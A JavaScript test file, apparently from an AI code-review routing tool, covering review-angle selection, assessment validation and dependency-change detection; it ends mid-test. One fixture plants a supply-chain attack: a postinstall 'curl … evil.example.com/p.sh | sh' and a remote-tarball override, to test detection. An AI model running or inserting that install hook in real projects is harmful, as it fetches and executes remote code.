import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';

import {
  ASSESSMENT_DIMENSIONS,
  ASSESSMENT_VERSION,
  SHADOW_NORMAL_ANGLES,
  assessCommand,
  buildRoutingPacket,
  computeShadowSelection,
  deriveShadowEscalatedAngles,
  deriveShadowMemoryConditional,
  loadAssessmentFile,
  validateAssessment,
} from '../scripts/agent/shadow-routing.js';
import { ANGLE_TOKENS, TIER_ANGLES } from '../scripts/agent/review-angle-tokens.js';
import {
  emptyState,
  escalateAngles,
  planCommand,
  saveState,
  stateFile,
} from '../scripts/agent/review-plan.js';
import { createSnapshot, latestSnapshot } from '../scripts/agent/review-snapshot.js';
import { makeTmpGitRepo, sh, write } from './helpers/tmpGitRepo.js';

// ---------------------------------------------------------------------------
// fixtures
// ---------------------------------------------------------------------------

function baseDimensions() {
  const dims = {};
  for (const key of ASSESSMENT_DIMENSIONS) {
    dims[key] = { value: 'false', evidence: ['bounded routing context に候補証拠なし'] };
  }
  return dims;
}

function assessmentFixture(snapshotId, overrides = {}) {
  return {
    assessmentVersion: ASSESSMENT_VERSION,
    snapshotId,
    dimensions: { ...baseDimensions(), ...overrides },
  };
}

function machineFactsFixture(overrides = {}) {
  return {
    executableChanged: false,
    docsOnly: true,
    testChanged: false,
    configChanged: false,
    guardChanged: false,
    newFiles: [],
    deletedFiles: [],
    renamedFiles: [],
    dependencyOnly: false,
    dependencyChanged: false,
    dependencySetChanged: false,
    dependencyVersionOnly: false,
    riskTableCandidate: false,
    ...overrides,
  };
}

function dim(value, evidence = ['evidence']) {
  return { value, evidence };
}

function makeRepo() {
  const dir = makeTmpGitRepo('shadow-routing-');
  write(dir, 'src/base.js', 'export const a = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  return dir;
}

// ---------------------------------------------------------------------------
// computeShadowSelection: §4.2 routing table
// ---------------------------------------------------------------------------

test('shadow selection: executableChanged ∧ executableBehavior=true → riskmodel,testquality', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ executableChanged: true, docsOnly: false }),
    dimensions: { ...baseDimensions(), executableBehavior: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles.sort(), ['riskmodel', 'testquality']);
});

test('shadow selection: executableChanged ∧ executableBehavior=uncertain → riskmodel,testquality（§14 D, dependency免除なしの通常経路）', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ executableChanged: true, docsOnly: false }),
    dimensions: { ...baseDimensions(), executableBehavior: dim('uncertain') },
  });
  assert.deepEqual(sel.selectedAngles.sort(), ['riskmodel', 'testquality']);
});

test('shadow selection: specRelevant=uncertain → spec', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), specRelevant: dim('uncertain') },
  });
  assert.deepEqual(sel.selectedAngles, ['spec']);
});

test('shadow selection: stateful=true → operability', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), stateful: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['operability']);
});

test('shadow selection: guardChanged=true（dimension は全て false）でも adversarial を選ぶ', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ guardChanged: true, docsOnly: false }),
    dimensions: baseDimensions(),
  });
  assert.deepEqual(sel.selectedAngles, ['adversarial']);
});

test('shadow selection: adversarialRelevant=uncertain（guardChanged=false・既知path外の新validator相当）でも adversarial を選ぶ（§14 K）', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ guardChanged: false, docsOnly: false }),
    dimensions: { ...baseDimensions(), adversarialRelevant: dim('uncertain') },
  });
  assert.deepEqual(sel.selectedAngles, ['adversarial']);
});

test('shadow selection: security=true → adversarial + /security-review sidecar', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), security: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['adversarial']);
  assert.deepEqual(sel.selectedSidecars, ['/security-review']);
});

test('shadow selection: docsOnly ∧ security=true → adversarial + /security-review sidecar（§14 Y, prose-only trust-boundary正本変更の回帰ガード）', () => {
  // docsOnly=true（executableChanged=false という既定値との組み合わせ）は buildRoutingPacket の
  // 不変条件（docsOnly === !executableChanged）と整合する、実際に到達可能な machineFacts。
  // security ルール自体は docsOnly を参照しないため「経路は同じ」に見えるが、これは
  // 「security が誤って docsOnly に依存するよう変更された場合の回帰」を検出できる唯一のテストで、
  // 上のテスト（docsOnly: false 固定）だけでは検出できない（敵対的レビュー所見・mutation実証:
  // shadow-routing.js の security 判定へ `&& !machineFacts.docsOnly` を混入させても、
  // このテストが無いと 57 pass / 0 fail のまま素通りする）
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: true }),
    dimensions: { ...baseDimensions(), security: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['adversarial']);
  assert.deepEqual(sel.selectedSidecars, ['/security-review']);
});

test('shadow selection: additiveSurface=true → subtractive', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), additiveSurface: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['subtractive']);
});

test('shadow selection: qualityRelevant=uncertain → quality', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), qualityRelevant: dim('uncertain') },
  });
  assert.deepEqual(sel.selectedAngles, ['quality']);
});

test('shadow selection: performanceSensitive=true → riskmodel', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), performanceSensitive: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['riskmodel']);
});

test('shadow selection: staleArtifactRisk=true → cleanup', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false }),
    dimensions: { ...baseDimensions(), staleArtifactRisk: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['cleanup']);
});

test('shadow selection: deletion candidate（machine fact のみ）でも cleanup を選ぶ', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ deletedFiles: ['old.js'], docsOnly: false }),
    dimensions: baseDimensions(),
  });
  assert.deepEqual(sel.selectedAngles, ['cleanup']);
});

test('shadow selection: rename candidate（machine fact のみ）でも cleanup を選ぶ（§14 J, rename経路）', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({
      renamedFiles: [{ path: 'new.js', oldPath: 'old.js' }],
      docsOnly: false,
    }),
    dimensions: baseDimensions(),
  });
  assert.deepEqual(sel.selectedAngles, ['cleanup']);
});

test('shadow selection: testChanged=true ∧ executableBehavior=false → testquality のみ（riskTable 候補なし）', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ testChanged: true, docsOnly: false }),
    dimensions: { ...baseDimensions(), executableBehavior: dim('false') },
  });
  assert.deepEqual(sel.selectedAngles, ['testquality']);
});

test('shadow selection: testChanged=true ∧ executableBehavior=false ∧ riskTable候補 → testquality,riskmodel', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ testChanged: true, riskTableCandidate: true, docsOnly: false }),
    dimensions: { ...baseDimensions(), executableBehavior: dim('false') },
  });
  assert.deepEqual(sel.selectedAngles.sort(), ['riskmodel', 'testquality']);
});

test('shadow selection: testChanged=true ∧ executableChanged=false ∧ executableBehavior=uncertain でも testquality を落とさない（敵対的レビュー所見: uncertain の fail-open）', () => {
  // executableChanged=false（executableBehavior ルールの対象外）で executableBehavior が
  // 'false' ではなく 'uncertain'/'true' でも、より安全側の回答で reviewer が減る逆転が
  // 起きてはならない
  for (const value of ['uncertain', 'true']) {
    const sel = computeShadowSelection({
      machineFacts: machineFactsFixture({ testChanged: true, docsOnly: true }),
      dimensions: { ...baseDimensions(), executableBehavior: dim(value) },
    });
    assert.ok(
      sel.selectedAngles.includes('testquality'),
      `executableBehavior=${value} でも testquality が落ちてはならない: ${JSON.stringify(sel.selectedAngles)}`,
    );
  }
});

test('shadow selection: docsOnly ∧ semanticDocs=false → selectedAngles 追加なし', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: true }),
    dimensions: baseDimensions(),
  });
  assert.deepEqual(sel.selectedAngles, []);
});

test('shadow selection: docsOnly ∧ semanticDocs=true ∧ 専門dimension無し → spec fallback 1系統', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: true }),
    dimensions: { ...baseDimensions(), semanticDocs: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['spec']);
});

test('shadow selection: docsOnly ∧ semanticDocs=true だが specRelevant が既に該当 → fallback は重複追加しない', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: true }),
    dimensions: { ...baseDimensions(), semanticDocs: dim('true'), specRelevant: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles, ['spec']);
  assert.ok(sel.explanation.some((e) => e.includes('specRelevant')));
  assert.ok(!sel.explanation.some((e) => e.includes('fallback')));
});

test('shadow selection: docsOnly ∧ semanticDocs=true では cleanup（deletion candidate）が spec fallback を握り潰さない', () => {
  // deletion candidate だけで cleanup が加算されても、専門 dimension（specRelevant 等）は
  // 何も該当していない。selectedAngles.size===0 で fallback をゲートすると cleanup の存在で
  // 誤って抑止される（仕様レビュー所見で実測）
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: true, deletedFiles: ['docs/old.md'] }),
    dimensions: { ...baseDimensions(), semanticDocs: dim('true') },
  });
  assert.deepEqual(sel.selectedAngles.sort(), ['cleanup', 'spec']);
});

test('shadow selection: dependencyOnly ∧ dependencyVersionOnly は executableBehavior=uncertain でも riskmodel/testquality を強制しない（scenario H）', () => {
  // executableBehavior を意図的に uncertain にする — 免除が実装されていなければ
  // executableChanged(=dependencyOnly由来のtrue) ∧ executableBehavior=uncertain の
  // rule1 がそのまま riskmodel/testquality を追加してしまう（仕様レビュー所見で実測）
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({
      executableChanged: true,
      docsOnly: false,
      dependencyOnly: true,
      dependencyChanged: true,
      dependencyVersionOnly: true,
    }),
    dimensions: { ...baseDimensions(), executableBehavior: dim('uncertain') },
  });
  assert.deepEqual(sel.selectedAngles, []);
});

test('shadow selection: dependencyVersionOnly の免除は他 dimension（specRelevant 等）の加算を妨げない', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({
      executableChanged: true,
      docsOnly: false,
      dependencyOnly: true,
      dependencyChanged: true,
      dependencyVersionOnly: true,
    }),
    dimensions: {
      ...baseDimensions(),
      executableBehavior: dim('uncertain'),
      specRelevant: dim('true'),
    },
  });
  assert.deepEqual(sel.selectedAngles, ['spec']);
});

test('shadow selection: dependencyVersionOnly の免除は model の executableBehavior=true（明示evidence付き）を握り潰さない（最終独立レビュー所見）', () => {
  // dependencyVersionOnly は dependency key の名前集合しか見ておらず、既存キーの値
  // （version specifier）が悪性URLへ差し替えられるサプライチェーン攻撃を検知できない。
  // model がそれを diff から読み取り executableBehavior=true と明示的に判定した場合は、
  // machine 側の「version-only に見える」免除がそれを無条件に上書きしてはならない
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture({
      executableChanged: true,
      docsOnly: false,
      dependencyOnly: true,
      dependencyChanged: true,
      dependencyVersionOnly: true,
    }),
    dimensions: {
      ...baseDimensions(),
      executableBehavior: dim('true', ['dependency source changed from npm registry to untrusted URL']),
    },
  });
  assert.deepEqual(sel.selectedAngles.sort(), ['riskmodel', 'testquality']);
});

test('shadow selection: dependencySetChanged は additiveSurface 経由でのみ subtractive を選ぶ（machine fact 単体では選ばない）', () => {
  const noJudgement = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false, dependencyChanged: true, dependencySetChanged: true }),
    dimensions: baseDimensions(),
  });
  assert.deepEqual(noJudgement.selectedAngles, []);
  const withJudgement = computeShadowSelection({
    machineFacts: machineFactsFixture({ docsOnly: false, dependencyChanged: true, dependencySetChanged: true }),
    dimensions: { ...baseDimensions(), additiveSurface: dim('uncertain') },
  });
  assert.deepEqual(withJudgement.selectedAngles, ['subtractive']);
});

test('shadow selection: escalatedAngles はそのまま出力へ渡る（重複排除）', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture(),
    dimensions: baseDimensions(),
    escalatedAngles: ['adversarial', 'adversarial', 'quality'],
  });
  assert.deepEqual(sel.escalatedAngles.sort(), ['adversarial', 'quality']);
});

test('shadow selection: memoryConditional=true → conditionalAngles に memory', () => {
  const sel = computeShadowSelection({
    machineFacts: machineFactsFixture(),
    dimensions: baseDimensions(),
    memoryConditional: true,
  });
  assert.deepEqual(sel.conditionalAngles, ['memory']);
});

// Phase 5 §15.4 authority switch: testquality は canonical normal angle として ANGLE_TOKENS へ
// 登録済み（launchable）。ただし legacyReviewContract の構成要素である TIER_ANGLES.Full は
// switch 前のまま凍結し、testquality を追加しない（registry 登録と Tier 必須系統への追加は
// 独立した決定。正本: docs/planning/review-system-phase5-plan.md §15.4）。
test('testquality は shadow・ANGLE_TOKENS の両方に存在するが、legacy TIER_ANGLES.Full には無い（§14 X）', () => {
  assert.ok(SHADOW_NORMAL_ANGLES.includes('testquality'));
  assert.ok(Object.hasOwn(ANGLE_TOKENS, 'testquality'));
  assert.ok(!TIER_ANGLES.Full.includes('testquality'));
});

// ---------------------------------------------------------------------------
// validateAssessment
// ---------------------------------------------------------------------------

test('validateAssessment: valid な assessment はそのまま通す', () => {
  const { valid, errors } = validateAssessment(assessmentFixture('snap-1'), { snapshotId: 'snap-1' });
  assert.equal(valid, true);
  assert.deepEqual(errors, []);
});

test('validateAssessment: dimension の欠落を検出する', () => {
  const a = assessmentFixture('snap-1');
  delete a.dimensions.security;
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-1' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('security')));
});

test('validateAssessment: 未知の enum 値を検出する', () => {
  const a = assessmentFixture('snap-1', { security: dim('maybe') });
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-1' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('security')));
});

test('validateAssessment: snapshotId の不一致は stale として検出する', () => {
  const a = assessmentFixture('snap-old');
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-new' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('stale')));
});

test('validateAssessment: 未知の assessmentVersion を拒否する', () => {
  const a = assessmentFixture('snap-1');
  a.assessmentVersion = 2;
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-1' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('assessmentVersion')));
});

test('validateAssessment: evidence が空配列なら拒否する', () => {
  const a = assessmentFixture('snap-1', { security: { value: 'true', evidence: [] } });
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-1' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('evidence')));
});

test('validateAssessment: 閉じた語彙外の dimension key を拒否する', () => {
  const a = assessmentFixture('snap-1');
  a.dimensions.unknownDimension = dim('true');
  const { valid, errors } = validateAssessment(a, { snapshotId: 'snap-1' });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes('unknownDimension')));
});

// ---------------------------------------------------------------------------
// deriveShadowEscalatedAngles: manual-escalation と tier-reclassification の分離
// ---------------------------------------------------------------------------

test('deriveShadowEscalatedAngles: manual-escalation 由来だけを含める', () => {
  const state = emptyState();
  state.escalations = [{ seq: 1, kind: 'manual-escalation', angles: ['adversarial', 'quality'], reason: 'x' }];
  assert.deepEqual(deriveShadowEscalatedAngles(state).sort(), ['adversarial', 'quality']);
});

test('deriveShadowEscalatedAngles: tier-reclassification 由来は含めない（AA シナリオ）', () => {
  const state = emptyState();
  state.escalations = [
    { seq: 1, kind: 'tier-reclassification', angles: ['spec', 'operability'], reason: null },
    { seq: 2, kind: 'manual-escalation', angles: ['adversarial'], reason: 'human' },
  ];
  assert.deepEqual(deriveShadowEscalatedAngles(state), ['adversarial']);
});

test('deriveShadowEscalatedAngles: escalate --angles memory は conditional のまま（通常 escalatedAngles へ型変換しない）', () => {
  const state = emptyState();
  state.escalations = [{ seq: 1, kind: 'manual-escalation', angles: ['memory'], reason: 'x' }];
  assert.deepEqual(deriveShadowEscalatedAngles(state), []);
});

// ---------------------------------------------------------------------------
// deriveShadowMemoryConditional: escalate --angles memory は shadow でも conditional に残る
// （PRレビュー所見: actual は widenEffectiveTier 経由で state.addedAngles に memory が乗り
// buildPlan の effectiveAngles にそのまま残るため、memoryRequired が一度も true にならなくても
// launch 対象に残る。shadow が memoryRequired / --memory-hits だけを見ていると、この経路で
// shadow が actual より義務を少なく観測してしまっていた）
// ---------------------------------------------------------------------------

test('deriveShadowMemoryConditional: memoryHits>0 または memoryRequired=true なら true', () => {
  const state = emptyState();
  assert.equal(deriveShadowMemoryConditional(state, 2), true);
  state.memoryRequired = true;
  assert.equal(deriveShadowMemoryConditional(state, 0), true);
});

test('deriveShadowMemoryConditional: escalate --angles memory 単体（hits=0・memoryRequired 未設定）でも true', () => {
  const state = emptyState();
  state.initialTier = 'Light';
  state.effectiveTier = 'Light';
  // 実際の actual runtime の escalateAngles を通す（widenEffectiveTier が state.escalations へ
  // kind: 'manual-escalation' として記録する経路をそのまま再現する）
  escalateAngles(state, { angles: ['memory'], reason: 'test' });
  assert.equal(state.memoryRequired, false, '前提: escalateAngles は memoryRequired を立てない');
  assert.equal(deriveShadowMemoryConditional(state, 0), true);
});

test('deriveShadowMemoryConditional: 無関係な escalation（memory を含まない）では true にならない', () => {
  const state = emptyState();
  state.escalations = [{ seq: 1, kind: 'manual-escalation', angles: ['adversarial'], reason: 'x' }];
  assert.equal(deriveShadowMemoryConditional(state, 0), false);
});

// ---------------------------------------------------------------------------
// loadAssessmentFile: missing/unreadable/invalid JSON を構造化して返す（throw しない）
// ---------------------------------------------------------------------------

test('loadAssessmentFile: --file 欠落', () => {
  const { assessment, error } = loadAssessmentFile(undefined);
  assert.equal(assessment, null);
  assert.equal(error.reason, 'missing-assessment-file');
});

test('loadAssessmentFile: 存在しないファイル', () => {
  const { assessment, error } = loadAssessmentFile('/nonexistent/path/assessment.json');
  assert.equal(assessment, null);
  assert.equal(error.reason, 'unreadable-assessment-file');
});

test('loadAssessmentFile: JSON として壊れている', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-badjson-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const path = join(dir, 'bad.json');
  write(dir, 'bad.json', '{ this is not json');
  const { assessment, error } = loadAssessmentFile(path);
  assert.equal(assessment, null);
  assert.equal(error.reason, 'invalid-assessment-json');
});

test('loadAssessmentFile: 正常な JSON は assessment を返し error は null', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-goodjson-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const path = join(dir, 'good.json');
  write(dir, 'good.json', JSON.stringify({ a: 1 }));
  const { assessment, error } = loadAssessmentFile(path);
  assert.deepEqual(assessment, { a: 1 });
  assert.equal(error, null);
});

// ---------------------------------------------------------------------------
// buildRoutingPacket / assessCommand: 実 git repo での結合テスト
// ---------------------------------------------------------------------------

test('buildRoutingPacket: full scope の guard 変更を previous-to-current ではなく base-to-current から検出する（full-scope vs fix-delta 分離）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  // hop1: guard pattern を含む追加
  write(dir, 'src/guard.js', 'export function check(x) {\n  if (!validate(x)) return false;\n  return true;\n}\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'add guard']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // hop2: guard と無関係な変更のみ
  write(dir, 'README.md', 'trivial change\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'trivial']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  // fix-delta（このhopの修正差分だけ）には guard 変更が無い
  assert.equal(snap.manifest.guardChangeInFix, false);

  const packet = buildRoutingPacket(snap, { cwd: dir });
  // full scope（base→current）には hop1 の guard 変更が含まれている
  assert.equal(packet.machineFacts.guardChanged, true);
});

test('buildRoutingPacket: guardChanged は docs（prose）ファイルの言及だけでは立たない（仕様レビュー所見）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  // docs-only diff。ガード関連の語（validate 等）を含むが executable ではない
  write(
    dir,
    'docs/agent-workflows/routing-notes.md',
    '# routing notes\n\nこの classifier は入力を validate し、allowlist と照合する。\n',
  );
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'docs: describe routing classifier']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(packet.machineFacts.docsOnly, true);
  assert.equal(
    packet.machineFacts.guardChanged,
    false,
    'prose ファイル内の "validate"/"allowlist" 等の言及だけでは guardChanged を立てない',
  );
});

test('buildRoutingPacket: guardChanged は既知 executable ファイルの内容変更では引き続き立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  write(dir, 'src/guard.js', 'export function check(x) {\n  if (!validate(x)) return false;\n  return true;\n}\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'add guard']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(packet.machineFacts.guardChanged, true);
});

test('buildRoutingPacket: dependency version-only（key set 不変）を証明できた場合だけ立てる', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-dep-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'package.json', JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.0' } }, null, 2));
  write(dir, 'package-lock.json', JSON.stringify({ name: 'x', lockfileVersion: 3 }, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  write(dir, 'package.json', JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.1' } }, null, 2));
  write(dir, 'package-lock.json', JSON.stringify({ name: 'x', lockfileVersion: 3, resolved: 'bump' }, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'bump foo']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(packet.machineFacts.dependencyChanged, true);
  assert.equal(packet.machineFacts.dependencySetChanged, false);
  assert.equal(packet.machineFacts.dependencyVersionOnly, true);
});

test('buildRoutingPacket: dependency set change（key 追加）を確認できたら version-only にしない', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-dep2-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'package.json', JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.0' } }, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  write(
    dir,
    'package.json',
    JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.0', bar: '^2.0.0' } }, null, 2),
  );
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'add bar']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(packet.machineFacts.dependencySetChanged, true);
  assert.equal(packet.machineFacts.dependencyVersionOnly, false);
});

test('buildRoutingPacket: dependency key set が不変でも postinstall/overrides を追加したら version-only にしない（敵対的レビュー所見）', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-dep3-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'package.json', JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.0' } }, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  // dependencies の key set は不変（foo のみ）だが、lifecycle script と overrides を追加する
  write(
    dir,
    'package.json',
    JSON.stringify(
      {
        name: 'x',
        dependencies: { foo: '^1.0.1' },
        scripts: { postinstall: 'curl -s https://evil.example.com/p.sh | sh' },
        overrides: { foo: 'https://evil.example.com/foo.tgz' },
      },
      null,
      2,
    ),
  );
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'bump foo + add postinstall/overrides']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(
    packet.machineFacts.dependencyVersionOnly,
    false,
    'dependency 以外のフィールド（scripts/overrides）が変わった場合は version-only を証明しない',
  );
});

test('buildRoutingPacket: lockfile だけへのパッケージ追加（package.json 不変）を version-only にしない（敵対的レビュー所見）', (t) => {
  const dir = makeTmpGitRepo('shadow-routing-dep4-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const lockBefore = {
    name: 'x',
    lockfileVersion: 3,
    packages: { '': { name: 'x' }, 'node_modules/foo': { version: '1.0.0' } },
  };
  write(dir, 'package.json', JSON.stringify({ name: 'x', dependencies: { foo: '^1.0.0' } }, null, 2));
  write(dir, 'package-lock.json', JSON.stringify(lockBefore, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  // package.json は一切変更しない。lockfile だけへ新しいパッケージを紛れ込ませる
  const lockAfter = {
    ...lockBefore,
    packages: { ...lockBefore.packages, 'node_modules/evil-transitive': { version: '1.0.0' } },
  };
  write(dir, 'package-lock.json', JSON.stringify(lockAfter, null, 2));
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'lockfile-only package addition']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  const snap = latestSnapshot(dir);
  const packet = buildRoutingPacket(snap, { cwd: dir });
  assert.equal(
    packet.machineFacts.dependencySetChanged,
    true,
    'lockfile の packages に新しいキーが増えたら dependencySetChanged=true にする',
  );
  assert.equal(packet.machineFacts.dependencyVersionOnly, false);
});

test('assessCommand: 作業ツリーが snapshot 取得後に変わっていたら stale として shadow failure にする（敵対的レビュー所見）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  // snapshot 取得後に、ガードを弱める変更を作業ツリーへ加える（snapshot は取り直さない）
  write(dir, 'src/guard.js', 'export function validatePath(p) { return true; }\n');

  const assessment = assessmentFixture(snap.snapshotId);
  const result = assessCommand({ cwd: dir, snap, assessment });
  assert.equal(result.valid, false);
  assert.equal(result.shadowFailure.reason, 'stale-snapshot');
  assert.equal(result.selection, null);
});

test('assessCommand: invalid assessment は shadow failure として記録し selection は null', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  const bad = assessmentFixture('stale-snapshot-id');
  const result = assessCommand({ cwd: dir, snap, assessment: bad });
  assert.equal(result.valid, false);
  assert.equal(result.selection, null);
  assert.ok(result.shadowFailure.errors.length > 0);
  assert.ok(result.machineFacts, 'shadow failure でも machineFacts は observability のため残す');
});

test('assessCommand: assessmentLoadError（--file 欠落等）は shadow failure として記録し throw しない（scenario Q・PRレビュー所見）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  const { assessment, error: assessmentLoadError } = loadAssessmentFile(undefined);
  const result = assessCommand({ cwd: dir, snap, assessment, assessmentLoadError });
  assert.equal(result.valid, false);
  assert.equal(result.shadowFailure.reason, 'missing-assessment-file');
  assert.equal(result.selection, null);
});

test('assessCommand: manual escalation と memory hits を読み取り専用で反映する（review-state.json は書き換えない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  const state = emptyState();
  state.initialTier = 'Light';
  state.effectiveTier = 'Light';
  state.escalations = [{ seq: 1, kind: 'manual-escalation', angles: ['adversarial'], reason: 'x' }];
  saveState(state, dir);
  const before = readFileSync(stateFile(dir), 'utf-8');

  const assessment = assessmentFixture(snap.snapshotId, { specRelevant: dim('true') });
  const result = assessCommand({ cwd: dir, snap, assessment, memoryHits: 2 });

  assert.equal(result.valid, true);
  assert.deepEqual(result.selection.selectedAngles, ['spec']);
